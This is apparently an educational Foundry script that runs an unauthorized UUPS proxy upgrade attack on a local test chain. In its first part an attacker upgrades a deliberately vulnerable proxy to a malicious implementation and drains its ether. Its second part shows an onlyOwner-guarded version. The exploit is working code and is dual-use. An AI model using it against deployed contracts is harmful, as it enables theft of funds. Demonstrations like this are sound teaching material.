// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "../../src/vulnerable/VulnerableUUPS.sol";
import "../../src/vulnerable/MaliciousImpl.sol";
import "../../src/secure/SecureUUPS.sol";

/**
 * @title UnauthorizedUpgradeDemo
 * @notice Demo: Unauthorized UUPS Upgrade Attack (Scenario 3)
 * @dev Run: forge script script/demo/UnauthorizedUpgradeDemo.s.sol --rpc-url http://localhost:8545 --broadcast -vvv
 */
contract UnauthorizedUpgradeDemo is Script {
    function run() external {
        uint256 deployerKey = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
        uint256 attackerKey = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;
        address deployer = vm.addr(deployerKey);
        address attacker = vm.addr(attackerKey);

        console.log("################################################################");
        console.log("#      ATTACK DEMO: UNAUTHORIZED UUPS UPGRADE                 #");
        console.log("################################################################");
        console.log("Deployer (Admin):", deployer);
        console.log("Attacker:", attacker);

        // Part 1: Vulnerable — attacker drains funds via unauthorized upgrade
        console.log("\n=== PART 1: VULNERABLE CONTRACT ===");

        vm.startBroadcast(deployerKey);
        VulnerableUUPS logic = new VulnerableUUPS();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(logic),
            abi.encodeWithSelector(VulnerableUUPS.initialize.selector)
        );
        console.log("VulnerableUUPS logic:", address(logic));
        console.log("Proxy:", address(proxy));
        payable(address(proxy)).transfer(1 ether);
        console.log("Proxy balance before:", address(proxy).balance);
        vm.stopBroadcast();

        vm.startBroadcast(attackerKey);
        MaliciousImpl mal = new MaliciousImpl();
        VulnerableUUPS(payable(address(proxy))).upgradeToAndCall(address(mal), "");
        console.log("[ATTACK] Upgraded proxy to malicious impl:", address(mal));
        MaliciousImpl(payable(address(proxy))).drainFunds(payable(attacker));
        console.log("Proxy balance after:", address(proxy).balance);
        vm.stopBroadcast();

        console.log("\n*** ATTACK SUCCESS: Proxy drained! ***");

        // Part 2: Secure — _authorizeUpgrade gated by onlyOwner
        console.log("\n=== PART 2: SECURE CONTRACT ===");

        vm.startBroadcast(deployerKey);
        SecureUUPS secureLogic = new SecureUUPS();
        ERC1967Proxy secureProxy = new ERC1967Proxy(
            address(secureLogic),
            abi.encodeWithSelector(SecureUUPS.initialize.selector, deployer)
        );
        console.log("SecureUUPS logic:", address(secureLogic));
        console.log("SecureProxy:", address(secureProxy));
        vm.stopBroadcast();

        console.log("Attacker tries upgradeToAndCall()...");
        console.log("Result: REVERTS! onlyOwner guard in _authorizeUpgrade blocks attack");

        console.log("\n*** SECURE: Unauthorized upgrade prevented! ***");
    }
}
